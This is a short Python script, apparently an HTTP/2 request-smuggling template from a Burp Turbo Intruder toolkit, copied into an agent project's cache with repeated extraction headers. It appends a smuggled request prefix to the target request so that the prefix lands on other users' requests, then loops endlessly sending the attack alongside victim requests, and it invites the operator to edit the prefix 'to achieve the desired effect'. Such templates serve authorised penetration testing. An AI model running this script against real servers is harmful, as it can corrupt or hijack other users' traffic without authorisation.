# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\cache.py\work.py\copilot_tmp.py\chunk_0_h2_te_350b4ff99230.py
# NOTE: extracted with static-only rules; review before use

# Extracted from: C:\DEV\PyAgent\.external\cache\work\copilot_tmp\chunk_0_H2_TE.py

# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-http-request-smuggler\resources\H2-TE.py

# NOTE: extracted with static-only rules; review before use


def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        engine=Engine.BURP2,
        maxRetriesPerRequest=0,
    )

    engine.start()

    # This will prefix the victim's request. Edit it to achieve the desired effect.

    prefix = """GET /robots.txt HTTP/1.1

X-Ignore: X"""

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise

    if "\r" not in prefix:
        prefix = prefix.replace("\n", "\r\n")

    # The request engine will auto-fix the content-length for us

    attack = target.req + prefix

    victim = target.req

    while True:
        engine.queue(attack)

        for i in range(4):
            engine.queue(victim)

            time.sleep(0.05)

        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)
